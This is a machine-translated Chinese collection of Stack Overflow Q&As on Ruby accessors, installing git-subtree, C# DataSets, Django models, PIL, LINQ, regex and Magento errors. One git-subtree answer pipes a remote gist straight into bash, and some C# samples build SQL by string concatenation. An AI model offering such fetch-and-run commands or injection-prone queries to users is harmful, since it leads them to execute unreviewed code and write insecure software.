我想避免在我的所有子类定义中使用这些相同的代码行。但是如果我把它放在超类定义中，那么它不会为超类的实例变量定义一个访问器吗？那不是我想要的。有没有办法在一个地方为所有子类的类实例变量定义访问器？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:24:09.817

请记住，attr_accessor 指令实际上定义了两个方法：x() 和 x=()。现在，如果您在超类中声明了两个公共方法，它们在子类中是否可用？答案是肯定的，除非你重新定义它们。

所以把这个指令放在超类中就好了，而且会很有魅力。

# eclipse - 比较eclipse中的编辑器

> ID：11603509
> 
> 赞同：0
> 
> 时间：2012-07-22T19:54:05.867
> 
> 标签：eclipse, editor, compare

我有时在 Eclipse 中使用 2 个编辑器（垂直分割屏幕）

我知道对于初学者来说，您可以通过从导航器中选择它们（例如，Ctrl + 单击）然后点击比较甚至使用键盘快捷键来比较两个文件

但是我想知道当前版本中是否有一种方法可以绕过始终显示的比较窗口并自动从左侧编辑器中选择活动文件，并从右侧编辑器中选择活动文件，就像在记事本++中一样（我可以只有两个视图并在那里按 Alt + D 并自动比较文件）

任何帮助表示赞赏，谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-23T01:37:52.290

Eclipse 中没有这样的功能。当然，您总是可以自由地编写可以做您想做的事情的插件。学习曲线有点陡峭，但总体而言，一旦您掌握了插件编写的窍门，您所描述的内容可能不会太多。

以下是一些帮助您入门的链接：

*   [http://www.vogella.com/articles/EclipsePlugIn/article.html](http://www.vogella.com/articles/EclipsePlugIn/article.html)
*   [http://www.vogella.com/eclipse.html](http://www.vogella.com/eclipse.html)
*   [http://www.eclipse.org/resources/?sort=date&category=Plug-ins](http://www.eclipse.org/resources/?sort=date&category=Plug-ins)

# git - 如何在 git 的 contrib 目录中正确安装工具？

> ID：11603510
> 
> 赞同：23
> 
> 时间：2012-07-22T19:54:16.600
> 
> 标签：git

Git 包括一[组由第三方提供的工具](https://github.com/git/git/tree/master/contrib)。我不确定我应该如何正确使用这些工具。

例如，我想使用[git-subtree](https://github.com/git/git/tree/master/contrib/subtree)。似乎有很多方法可以使用它：

1.  **复制到我的路径**

    ```
     cp /path/to/git-subtree.sh /usr/local/bin/git-subtree
     chmod +x /usr/local/bin/git-subtree 
    ```

    工作正常，感觉有点hacky。

2.  **符号链接到我的路径**

    ```
     chmod +x /path/to/git-subtree.sh
     ln -s /path/to/git-subtree.sh /usr/local/bin/git-subtree 
    ```

    也有效，感觉稍微不那么hacky

3.  **使用 git 别名**

    将以下内容添加到我的全局 .gitconfig 文件中：

    ```
     [alias]
         subtree = !/path/to/git-subtree.sh 
    ```

    然后又是好老 chmod：

    ```
     chmod +x /path/to/git-subtree.sh 
    ```

    工作，感觉一切都很好和 git-ish。

4.  **使用 Makefile**

    根据[安装文件](https://github.com/git/git/blob/master/contrib/subtree/INSTALL)。

    ```
     cd /path/to/git-subtree.sh
     make
     make install
     make install-doc 
    ```

    对我不起作用，它会尝试安装到不存在的路径。也许这是因为我使用[自制软件](https://brew.sh/)安装了 git而不是从源代码安装？我懒得去调查；我已经有了三个可行的选择。:)

所以我的问题是，其中哪一个是安装 git-contrib 附加组件的首选方式？有没有首选的方法？有没有我没有建议的比上面列出的更好的选择？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-23T13:31:20.760

来自 git/contrib/git-subtree：

> 如何安装 git-subtree
> ===========================
> 
> 首先，从顶级源目录构建。
> 
> 然后，在 contrib/subtree 中，运行：
> 
> ```
>  make
>  make install
>  make install-doc 
> ```
> 
> 如果您使用 configure 进行主要构建，则 git-subtree 构建将获取这些设置。如果没有，您可能必须为前缀提供一个值：
> 
> ```
>  make prefix=<some dir>
>  make prefix=<some dir> install
>  make prefix=<some dir> install-doc 
> ```
> 
> 要运行测试，首先将 git-subtree 复制到主构建区域，以便新构建的 git 可以找到它：
> 
> ```
>  cp git-subtree ../.. 
> ```
> 
> 然后：
> 
> ```
>  make test 
> ```

我刚刚验证了这行得通：

1.  通过现有的 git 下载的源代码
2.  安装的构建部门

    ```
    $ apt-get install libcurl4-gnutls-dev libexpat1-dev gettext libz-dev libssl-dev 
    ```

3.  查看最新的发布分支并构建

    ```
    $ git co v1.7.11.3  
    $ make prefix=/usr/local all  
    $ sudo make prefix=/usr/local install 
    ```

4.  构建和安装贡献/子树

    ```
    $ cd contrib/subtree  
    $ make  
    $ make install  
    $ make install-doc 
    ```

5.  验证一切正常

    ```
    /usr/local/bin/git  
    [todd@montreal-01 subtree ((v1.7.11.3))]$ git --version  
    git version 1.7.11.3 
    ```

检查，我们有最新的 git。

```
[todd@montreal-01 subtree ((v1.7.11.3))]$ git subtree  
usage: git subtree add   --prefix=<prefix> <commit>  
    or: git subtree merge --prefix=<prefix> <commit>  
    or: git subtree pull  --prefix=<prefix> <repository> <refspec...>  
    or: git subtree push  --prefix=<prefix> <repository> <refspec...>  
    or: git subtree split --prefix=<prefix> <commit...>

    -h, --help            show the help  
    -q                    quiet  
    -d                    show debug messages  
    -P, --prefix ...      the name of the subdir to split out  
    -m, --message ...     use the given message as the commit message for the merge commit  

options for 'split'  
    --annotate ...        add a prefix to commit message of new commits  
    -b, --branch ...      create a new branch from the split subtree  
    --ignore-joins        ignore prior --rejoin commits  
    --onto ...            try connecting new tree to an existing one  
    --rejoin              merge the new branch back into HEAD  

options for 'add', 'merge', 'pull' and 'push'  
    --squash              merge subtree changes as a single commit 
```

检查，我们有子树工作。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-27T09:31:05.077

这是对我有用的最简单的方法，在 Ubuntu 12.10 上安装 git-subtree：

获取代码

```
git clone https://github.com/git/git.git --depth=1
cd git/contrib/subtree
make 
```

将其“安装”到 git 工具目录中

```
sudo cp git-subtree /usr/lib/git-core/ 
```

对于手册页，您需要 asciidoc 这不是一个小型安装，但如果您有它：

```
make doc
gzip git-subtree.1
sudo cp git-subtree.1.gz /usr/share/man/man1 
```

就是这样。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-07-22T20:01:50.427

Contribs 是有用的东西的集合。您不会将它们作为软件包安装。例如，要安装选项卡补全，您只需从 .bash_profile 脚本中获取该脚本。该文件夹中的每个贡献者都有自己的使用方式。

至于从源代码编译 git

```
make
sudo make install 
```

安装所有先决条件后。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-28T23:24:49.780

所有这些看起来都比必要的复杂一些..
（也许是因为 install.sh 是最近添加的？）
这对我有用。或者看起来是这样。

```
# go to a directory where it's ok to put temporary stuff
cd ~
git clone git://github.com/apenwarr/git-subtree.git
cd git-subtree/
# shell script does the job for you.
sudo sh ./install.sh
cd ..
# remove the git cloned stuff, now that all relevant things have been copied (we hope)
rm -r git-subtree

# test that it works
git subtree
# should print some help/usage stuff. 
```

有一条指令主要是这样说的：
[https ://github.com/apenwarr/git-subtree/blob/master/INSTALL](https://github.com/apenwarr/git-subtree/blob/master/INSTALL)

我比那更愚蠢。我需要被告知，在运行 shell 脚本之前，我必须将东西下载（git clone）到*任意位置*，并且可以在之后处理这些东西。

install.sh 的内容很有启发性，
[https://github.com/apenwarr/git-subtree/blob/master/install.sh](https://github.com/apenwarr/git-subtree/blob/master/install.sh)
如果你想安装一个不提供 install.sh 的 git thingie就其本身而言，这可能是一个开始的地方。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-22T14:26:25.170

# 一个命令中的所有以下内容，仅在 Ubuntu 中测试：

```
curl -L https://raw.github.com/gist/3426227 | bash 
```

# 现在，这里是如何在 ubuntu 中使用 git 作为包安装最新的 git

将其作为一个包进行（最好）：

```
sudo apt-get remove git -y
sudo apt-get install libcurl4-gnutls-dev libexpat1-dev gettext libz-dev libssl-dev asciidoc 
```

如果您不安装 asciidoc，请忽略下面带有 make target 'install-doc' 的行。

这将检查 master/latest 标记版本并将其与[checkinstall](https://help.ubuntu.com/community/CheckInstall)一起安装为一个包。

```
git clone https://github.com/git/git.git
cd git
make prefix=/usr/local all
sudo checkinstall --pkgname=git make prefix=/usr/local install 
```

然后是贡献：

```
cd contrib/subtree
make prefix=/usr/local
sudo checkinstall --pkgname=git-subtree make prefix=/usr/local install 
```

...回答`yes`或`y`回答是否从主文件夹中排除文件的问题。

```
sudo checkinstall --pkgname=git-subtree-doc make prefix=/usr/local install-doc 
```

...回答`yes`或`y`回答是否从主文件夹中排除文件的问题。

您现在可以处理 git 包：

```
dpkg -r git 
```

和子树包：

```
dpkg -r git-subtree
dpkg -r git-subtree-doc 
```

如果您不想在之后有半 GB 的乳胶 perl 脚本占用硬盘空间：

```
sudo apt-get remove asciidoc -y
sudo apt-get autoremove -y 
```

**或**全部（所有构建部门）

```
sudo apt-get remove -y libcurl4-gnutls-dev libexpat1-dev gettext libz-dev libssl-dev asciidoc
sudo apt-get autoremove -y 
```

感谢@toddg 提供了我需要的基本命令！

我还不能`git subtree --help`查找正确的手册页。

# c# - 使用数据集中的返回值

> ID：11603517
> 
> 赞同：1
> 
> 时间：2012-07-22T19:55:07.040
> 
> 标签：c#, asp.net, sql-server, dataset

我有一个返回数据集的方法。

```
 protected DataSet GetProgramList()
    {
        DataSet ds1 = new DataSet();
        using (SqlConnection cn = new SqlConnection("server=Daffodils-PC\\sqlexpress;Database=Assignment1;Trusted_Connection=Yes;"))
        {
            using (SqlDataAdapter da = new SqlDataAdapter(@"SELECT * FROM Program", cn))
                da.Fill(ds1, "Program");
        }
        return ds1;
    } 
```

我想在其他方法中使用 DataSet 中的特定列，如下所示：

```
protected DataSet GetStudentByProgramID(int programID)
{
    DataSet ds2 = new DataSet();
    using (SqlConnection cn = new SqlConnection("server=Daffodils-PC\\sqlexpress;Database=Assignment1;Trusted_Connection=Yes;"))
    {
        using (SqlDataAdapter da = new SqlDataAdapter(@"SELECT LastName, FirstName FROM Student JOIN Program on Program.ProgramID = Student.ProgramID WHERE ProgramID ="+programID, cn))
            da.Fill(ds2, "Student");
    }
    return ds2;
} 
```

例如，我想在*第*一种方法中使用**Program** Table 中的**ProgramID**列。我知道我必须将返回的数据集存储在一个变量中，但是**如何**？

 ****** * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:09:52.187

鉴于您将可以`ds1`访问`GetStudentByProgramID`方法

然后你可以这样使用它

```
rotected DataSet GetStudentByProgramID(int programID)
{

 DataColumn programId = ds1.Tables[0].Columns["ProgramId"];
//to read row you can iterate from ds1.Table[0].Rows

DataSet ds2 = new DataSet();
using (SqlConnection cn = new SqlConnection("server=Daffodils-PC\\sqlexpress;Database=Assignment1;Trusted_Connection=Yes;"))
{
using (SqlDataAdapter da = new SqlDataAdapter(@"SELECT LastName, FirstName FROM Student WHERE ProgramID ="+programID, cn))
da.Fill(ds2, "Student");
}
return ds2;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:03:07.990

*你为什么不写一个查询？*

```
SELECT programID, LastName, FirstName 
FROM Program JOIN Student ON Program.Id=Student.ProgramId 
```

这样，您将为每个学生提供他们的 programID。*****

# python - 对象相互关系列表的django模型？

> ID：11603518
> 
> 赞同：0
> 
> 时间：2012-07-22T19:55:13.930
> 
> 标签：python, django, design-patterns

我有一个社会集团对象。

在每个社交集团对象中，我都有一个朋友对象列表。

每个朋友对象都有一个与其他朋友的关系对象（充满有趣的事实，比如他们何时相遇）*。*

在这里我被卡住了。如何正确定义我的模型，以便我可以查询任何朋友对象以提取他们的共享关系对象？

我没有看到这可以简单地用[像这个答案这样的双向模型](https://stackoverflow.com/questions/4881578/django-bi-directional-manytomany-how-to-prevent-table-creation-on-second-model)来解决，因为我正在处理一个庞大且不断增长的朋友对象列表（在链接到的解决方案中，他们创建了两个不同的模型，例如friend_a和friend_b）。

我目前的方法是让关系对象看起来像下面发布的内容。我必须在我的代码中添加逻辑以防止重复的关系对象......但是这个

```
 class Relationship(models.Model):
     social_clique = models.ForeignKey( Social_Clique )
     friend_0 = models.ManyToManyField( Friend, related_name='friend_0' )
     friend_1 = models.ManyToManyField( Friend, related_name='friend_1' ) 
```

我觉得我缺少正确的关键字来谷歌找到这个问题的 ORM 设计模式。关于这个问题的正确描述或如何解决这个问题的任何建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:09:49.493

`friend_x`任何一个字段都是 ManyToManys是没有意义的。朋友之间的关系是ManyToMany，但`Relationship`本身就是多对多关系中的中介模型（故名）。所以friend_字段应该是ForeignKeys，然后使用Relationship作为`through`模型另外定义一个从Friend到自身的ManyToMany字段：

```
class Relationship(models.Model):
    social_clique = models.ForeignKey(Social_Clique)
    friend_0 = models.ForeignKey(Friend, related_name='friend_0')
    friend_1 = models.ForeignKey(Friend, related_name='friend_1')

class Friend(models.Model):
    ... other fields ...
    friends = models.ManyToManyField('Friend', through=Relationship) 
```

现在很容易从两个朋友 (`me`和`my_friend`) 转到他们的共享关系：

```
Relationship.objects.get(friend_0=me, friend_1=my_friend) 
```

或者

```
me.friend_0.filter(friend1=my_friend) 
```

等等，你仍然可以得到我所有的朋友：

```
me.friends.all() 
```

# xampp - 使用不同驱动器时的 XAMPP DocumentRoot

> ID：11603519
> 
> 赞同：1
> 
> 时间：2012-07-22T19:55:15.683
> 
> 标签：xampp, httpd.conf, drive, document-root, htdocs

我已经将我的 DocumentRoot 和 Directory 更改为都指向 httpd.conf 文件中的 D:/Docs/Websites/projectname，但是每次我去 localhost/index.php 时，就像 XAMPP 甚至没有注册我'我更改了任何内容并重定向到 localhost/XAMPP。

我已经搜索了大约一个小时没有运气，是否可以将您的工作目录放在另一个驱动器上？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-24T20:33:49.360

解决了。只是忘记了在编辑 httpd.conf 文件后需要重新启动 Apache。希望这对其他人有帮助。

# visual-studio-2010 - vs2010 express的图片库

> ID：11603520
> 
> 赞同：0
> 
> 时间：2012-07-22T19:55:18.600
> 
> 标签：visual-studio-2010, image, imagemagick

我正在寻找在 vs2010 下工作的图像库。我尝试了 imagemagick（及其 api magick++），但这需要从头开始构建它，这是不可取的。

它不必像 imagemagick 那样先进。我需要它来打开最流行的图像文件并将它们转换为 RGB888 或 RGB565 数据的原始数组。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-24T21:08:18.313

我的解决方案是切换到 C# 并使用它的内部 Image 类。奇迹般有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-05T15:08:51.700

第 1 步：下载 Magick++ [http://www.imagemagick.org/Magick++/](http://www.imagemagick.org/Magick++/) 在“获取 Magick++”标题下，点击“ftp”链接，然后选择适用于您居住地的下载镜像。如果您没有去 sourceforge 或类似的地方，您现在应该会看到一个 ftp 列表。向下滚动并单击“binaries”目录，我下载了“ImageMagick-6.8.6-9-Q16-x86-dll.exe”（当时的当前版本是 6.8.6-9）。

第 2 步：安装 Magick++ 运行 .exe 和 next，next，next，直到出现下面的屏幕，并确保选择“install development headers for C and C++”。还要确保记下安装路径，因为我们稍后需要它。

完成安装并启动 Visual Studio 2010。

第 3 步：将 Magick++ 添加到项目中 打开项目属性并在顶部，将配置设置为“所有配置”或发布（活动）。Magick++ 不喜欢在 Visual Studio 的 Debug 模式下运行，因此您必须构建为 Release，否则 ImageMagick 会不高兴。

在左侧的项目属性列表中，展开

Configuration Properties->General 添加 ImageMagick Include 文件夹作为附加依赖项。这也是您需要知道 ImageMagick 安装位置的地方。接下来选择项目属性左侧栏C/C++部分下的“代码生成”，并确保“运行时库”为“多线程（/MT）”</p>

展开 C/C++ 下的“Linker”部分，并将 ImageMagick 的 lib 目录添加为附加依赖项（如上图，只需“lib”而不是“include”。</p>

快到了.. 现在点击左侧边栏链接器部分下的“输入”。添加一个附加依赖项并添加这些：

CORE_RL_magick_.lib CORE_RL_Magick++_.lib CORE_RL_wand_.lib

第 4 步：添加标头和命名空间

命名空间标识符，你应该很高兴！

# python - PIL 保存时更改像素值

> ID：11603528
> 
> 赞同：10
> 
> 时间：2012-07-22T19:56:53.057
> 
> 标签：python, image, save, python-imaging-library

这很简单。制作 RGB 图像，一个像素大。将像素值设置为 (a,b,c)。节省。问题是，保存的图像的像素值与 (a,b,c) 不同。通常，在其中一个通道上使用 +-1，就好像它是随机噪声，但它是一致的。继承人的代码：

```
from PIL import Image
newImg = Image.new('RGB', (1,1), "black")
pixels = newImg.load()
pixels[0,0] = (0,3,0)
newImg.save("point.jpg")
savedImage = Image.open("point.jpg")
pixelsSaved = savedImage.load()

print pixels[0,0]
print pixelsSaved[0,0] 
```

输出为： (0, 3, 0) (1, 3, 0)

始终如一。

如果我使用 (4, 2, 0) 作为要保存的像素，则输出为： (4, 2, 0) (3, 2, 0)

和 (0,10,0) 给出： (0, 10, 0) (0, 10, 1)

例如。

为什么储蓄后价值会发生变化？我该如何预防？请帮忙。

谢谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-22T20:08:45.483

将其保存为`.png`. `.jpg`是一种有损压缩格式。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-07-22T23:26:57.513

JPG 不承诺精确存储您想要的像素。它会压缩您的数据以使文件更小，并且压缩是基于人类感知的。这个想法是创建一个对人类来说看起来相同的像素阵列，即使它们是不同的像素。

因此，您正在写入的像素在输出中，但相邻像素已被更改，以便能够在更小的空间中存储整个图像。这称为“有损压缩”，因为数据会丢失。

其他图像格式没有这个属性。PNG 是一种无损压缩格式，这意味着解压缩压缩的 PNG 后将产生完全相同的像素。如果您将图像保存为 PNG，您将获得所需的结果。

# c# - LINQ Join 从第二个表中获取最新记录

> ID：11603530
> 
> 赞同：3
> 
> 时间：2012-07-22T19:57:17.317
> 
> 标签：c#, asp.net, linq

问题：

它们是两个表 TableEmails 和 TableSentEmailRecords。因此，每当发送电子邮件时，发送时间等记录都会存储在 TableSentEmailRecords 中。

我想做一个 LINQ 查询，它让我得到 TableEmails 的列以及来自 TableSentEmailRecords 的“SentDate”列，该列显示电子邮件发送的最新日期。

我试过这个：

```
List<CustomEmail> emails = new List<CustomEmail>();

var query = from c in db.TableEmails 
            join o in db.TableSentEmailRecords on c.EmailId equals o.EmailId
                        select new CustomEmail
                        {
                            EmailName = c.EmailName,
                            EmailId= c.EmailId,
                            EmailDescription = c.EmailDescription,
                            LastDateEmailSentOut = o.SentDate
                        };

emails = query.ToList(); 
```

但这不一定从 TableSentEmailRecords 表中获取该特定电子邮件的最新记录。

有任何想法吗 ？？？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T20:07:13.707

您可以只使用嵌套查询而不是连接：

```
var query = from c in db.TableEmails 
            select new CustomEmail
            {
                EmailName = c.EmailName,
                EmailId= c.EmailId,
                EmailDescription= c.EmailDescription,
                LastDateEmailSentOut = db.TableSentEmailRecordson
                                         .Where(x => x.EmailId = c.EmailId)
                                         .Max(x => x.SentDate)
            }; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-23T00:58:27.513

我认为 GroupJoin 在这种情况下是正确的方法。使用子查询会起作用，但效率不会那么高。抱歉，我不太了解更简单的查询语法，尤其是我不知道如何使用它进行组加入。也许有人可以翻译。

```
db.TableEmails.GroupJoin(db.TableSendEmailRecordson,
  o => o.EmailID,
  i => i.EmailID,
  (o, i) => new
  {
    EmailName = c.EmailName,
    EmailId= c.EmailId,
    EmailDescription= c.EmailDescription,
    LastDateEmailSentOut = i.Max(x => x.SentDate)
  }) 
```

要从 TableSendEmailRecordson 获取所有详细信息，您可以执行以下操作：

```
db.TableEmails.GroupJoin(db.TableSendEmailRecordson,
  o => o.EmailID,
  i => i.EmailID,
  (o, i) => new
  {
    EmailName = c.EmailName,
    EmailId= c.EmailId,
    EmailDescription = c.EmailDescription,
    LastSendEmailRecordson = i.FirstOrDefault(y => y.SentDate == i.Max(x => x.SentDate))
  }) 
```

这可能会抱怨被翻译成 SQL，如果是这种情况，那么您需要先获取数据，然后在查询中使用结果，例如

```
var emails = db.TableEmails.ToArray();
var emailSend = db.TableSendEmailRecordson.ToArray(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T20:04:53.350

你可以尝试这样的事情：

```
var query = (from c in db.TableEmails 
            join o in db.TableSentEmailRecordson c.EmailId equals o.EmailId
            select new CustomEmail
            {
                EmailName = c.EmailName,
                EmailId = c.EmailId,
                EmailDescription = c.EmailDescription,
                LastDateEmailSentOut = o.SentDate
            }).OrderByDescending(c => c.LastDateEmailSentOut).ToList(); 
```

# c# - Windows Phone Silverlight 页面导航

> ID：11603531
> 
> 赞同：0
> 
> 时间：2012-07-22T19:57:19.520
> 
> 标签：c#, wpf, silverlight, windows-phone-7

我有两个关于 Windows Phone 页面导航的问题：

1.  有没有办法获取我正在导航到的页面实例？也就是说，如果我在第一页并且想要导航到 page2 到按钮单击时，我可以在 page2 通过`NavigationService.Navigate("page_2_uri")`第 1 页中的调用初始化之后获取 page2 实例吗？
2.  有没有办法知道我从哪个页面导航？例如，我目前在第 3 页，我想做类似的事情：如果第 3 页是从第 2 页导航的，我会这样做，否则我会这样做。

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T21:10:18.087

> 1.  有没有办法获取我正在导航到的页面实例？

不。

> 1.  有没有办法知道我从哪个页面导航？

是的。遍历[NavigationService.BackStack](http://msdn.microsoft.com/en-us/library/system.windows.navigation.navigationservice.backstack%28v=vs.92%29.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-22T21:07:27.367

1.  使用 NavigationService 在页面之间导航的想法是您不需要了解有关目的地的任何详细信息。因此，在您的示例中，直到您离开第 1 页，第 2 页才被初始化，因此第 1 页不再在范围内，并且无法对第 2 页执行任何操作。如果您想传递信息/上下文到第 2 页，id 建议使用查询参数（请参阅下一个答案）。如果您想知道导航的去向，可以覆盖[OnNavigatedFrom](http://msdn.microsoft.com/en-us/library/system.windows.controls.page.onnavigatedfrom%28v=vs.95%29)事件并查看[NavigationEventArgs](http://msdn.microsoft.com/en-us/library/system.windows.navigation.navigationeventargs%28v=vs.95%29)的 Uri 属性。

2.  我建议查看 Silverlight Page 类的[NavigationContext](http://msdn.microsoft.com/en-us/library/system.windows.controls.page.navigationcontext%28v=vs.95%29)属性。此属性允许您查看导航请求的 QueryString。使用这种方法，您可以使用“page_3?previous_page=2”之类的 uri 导航到第 3 页，然后从 NavigationContext 的 QueryString 中提取 previous_page 以查看您来自哪里。

# regex - 正则表达式 - 最后一个字符没有下划线

> ID：11603534
> 
> 赞同：1
> 
> 时间：2012-07-22T19:57:30.730
> 
> 标签：regex, tcl, expect

我需要帮助编写正则表达式以满足以下要求：

*   以一封信开头
*   以字母或数字结尾
*   只有字母、数字、下划线和连字符作为内部字符

以下表达式运行良好，但它允许下划线作为最后一个字符。它应该只允许最后一个字符使用字母或数字：

```
 ^[A-Za-z][\w-]*\w$ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T20:08:03.753

### 使用字符类

您可以为此使用[POSIX 字符类](http://en.wikipedia.org/wiki/Regular_expression#POSIX_character_classes)。特别是，您可以使用 alphanumeric 类，它是`[A-Za-z0-9]`. 例如：

```
^[A-Za-z][\w-]*[[:alnum:]]$ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-22T21:12:38.820

执行您要求的方法之一是使用负前瞻约束：

```
^[A-Za-z][\w-]*(?!_)\w$
```

另一种方法是写出你想要的字符类（Tcl定义`\w`为`[[:alnum:]_]`，即`alnum`类*加*下划线）：

```
^[A-Za-z][\w-]*[[:alnum:]]$
```

这些接受*完全相同的*字符串。哪个更好？好吧，唯一可以确定的真正方法是测试（这些时间是在我的旧笔记本电脑上使用较旧的 Tcl 版本；查看*相对*时间，而不是绝对时间）：

```
% set a "abc123abc123abc123_123"
abc123abc123abc123_123
% set b "abc123abc123abc123123_"
abc123abc123abc123123_
% regexp {^[A-Za-z][\w-]*(?!_)\w$} $a
1
% regexp {^[A-Za-z][\w-]*(?!_)\w$} $b
0
% time {regexp {^[A-Za-z][\w-]*(?!_)\w$} $a} 1000
21.207069999999998 microseconds per iteration
% time {regexp {^[A-Za-z][\w-]*(?!_)\w$} $b} 1000
20.577612000000002 microseconds per iteration
% regexp {^[A-Za-z][\w-]*[[:alnum:]]$} $a
1
% regexp {^[A-Za-z][\w-]*[[:alnum:]]$} $b
0
% time {regexp {^[A-Za-z][\w-]*[[:alnum:]]$} $a} 1000
4.0455700000000006 microseconds per iteration
% time {regexp {^[A-Za-z][\w-]*[[:alnum:]]$} $b} 1000
3.510597 microseconds per iteration 
```

这对我来说看起来很有结论：当你可以编写你真正想要的类时，不要使用前瞻约束。（看起来RE引擎也有未来优化的潜力......）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T20:00:06.380

您应该使用`^[a-zA-Z][-\w]*[a-zA-Z\d]$`或`^[a-zA-Z][-\w]*[^\W_]$`

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-07-22T20:01:01.653

```
^[a-z][a-z0-9_\-]+[a-z0-9]$(?i) 
```

# python - 在 python/basemap 中绘制多行

> ID：11603537
> 
> 赞同：4
> 
> 时间：2012-07-22T19:58:05.900
> 
> 标签：python, matplotlib, matplotlib-basemap

我刚刚开始学习 python/matplotlib/basemap 并且真的可以使用一些帮助。你如何绘制多条线？

假设我的数据看起来像：

```
[(lat1,lon1) (lat2,lon2) (lat3,lon3)]
[(lat1,lon1) (lat2,lon2) (lat3,lon3)]
[(lat1,lon1) (lat2,lon2) (lat3,lon3)]
... 
```

我想为数据中的每一行绘制一条单独的行。然而，我的代码得到的是将前一行的最后一个点连接到当前行的第一个点。谁能帮我解决这个问题？谢谢！

编辑：这是我的代码：

```
for page in files:
    file = open(dir + '/' + page)
    for line in file:
       lines = line.split()
       time = lines[0]
       lon = lines[1]
       lat = lines[2]
       lon_float = float(lon)
       lat_float = float(lat)
       lats.append(lat_float)
       lons.append(lon_float)
    x,y = m(lons, lats)
    m.plot(x,y,'D-')
plt.show() 
```

我想为每个文件（有多个纬度/经度对）绘制一条线另外，m 是我的 Baseplot 实例

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:12:04.840

您没有清除`lats`，`lons`因此每次通过文件循环时，您都在累积积分。

```
for page in files:
    file = open(dir + '/' + page)
    lats = []
    lons = []
    for line in file:
        ... 
```

编辑：完全重写答案

# magento - magento - 类别页面显示 - “错误处理您的请求”

> ID：11603539
> 
> 赞同：0
> 
> 时间：2012-07-22T19:58:49.127
> 
> 标签：magento, magento-1.6

在 Magento 1.6.x 测试站点上，我正在修改产品和类别。突然之间，所有指向类别的链接（例如：catalog/category/view/s/myCat/id/9/）给了我丑陋的 - “错误处理您的请求”页面。

重新索引，清除缓存，甚至重新启动服务器，但消息不断返回。

我尝试删除根类别并重新创建一个新的根类别，以及包含产品的子类别。

然后验证产品是否已启用，带有库存，链接到类别等。

然后再次验证新的管理商店 -> 主网站 -> 'root2 目录' 已链接到商店。

新的类别链接出现在主页上正常，但链接到它们时仍然出错。产品页面仍然可以正常工作。

日志中没有任何内容。

下一步是什么？

日志看起来像这样...

```
a:5:{i:0;s:61:"Invalid method Mage_Catalog_Block_Product_List::s(Array
(
)
)";i:1;s:3956:"#0 C:\xampp\htdocs\magento\app\design\frontend\base\default\template\catalog\product\list.phtml(9): Varien_Object->__call('s', Array)
#1 C:\xampp\htdocs\magento\app\design\frontend\base\default\template\catalog\product\list.phtml(9): Mage_Catalog_Block_Product_List->s()
#2 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Template.php(241): include('C:\xampp\htdocs...')
#3 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Template.php(272): Mage_Core_Block_Template->fetchView('frontend\base\d...')
#4 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Template.php(286): Mage_Core_Block_Template->renderView()
#5 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Abstract.php(863): Mage_Core_Block_Template->_toHtml()
#6 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Abstract.php(582): Mage_Core_Block_Abstract->toHtml()
#7 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Abstract.php(526): Mage_Core_Block_Abstract->_getChildHtml('product_list', true)
#8 C:\xampp\htdocs\magento\app\code\core\Mage\Catalog\Block\Category\View.php(85): Mage_Core_Block_Abstract->getChildHtml('product_list')
#9 C:\xampp\htdocs\magento\app\design\frontend\base\default\template\catalog\category\view.phtml(70): Mage_Catalog_Block_Category_View->getProductListHtml()
#10 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Template.php(241): include('C:\xampp\htdocs...')
#11 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Template.php(272): Mage_Core_Block_Template->fetchView('frontend\base\d...')
#12 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Template.php(286): Mage_Core_Block_Template->renderView()
#13 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Abstract.php(863): Mage_Core_Block_Template->_toHtml()
#14 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Text\List.php(43): Mage_Core_Block_Abstract->toHtml()
#15 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Abstract.php(863): Mage_Core_Block_Text_List->_toHtml()
#16 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Abstract.php(582): Mage_Core_Block_Abstract->toHtml()
#17 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Abstract.php(526): Mage_Core_Block_Abstract->_getChildHtml('content', true)
#18 C:\xampp\htdocs\magento\app\design\frontend\base\default\template\page\3columns.phtml(49): Mage_Core_Block_Abstract->getChildHtml('content')
#19 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Template.php(241): include('C:\xampp\htdocs...')
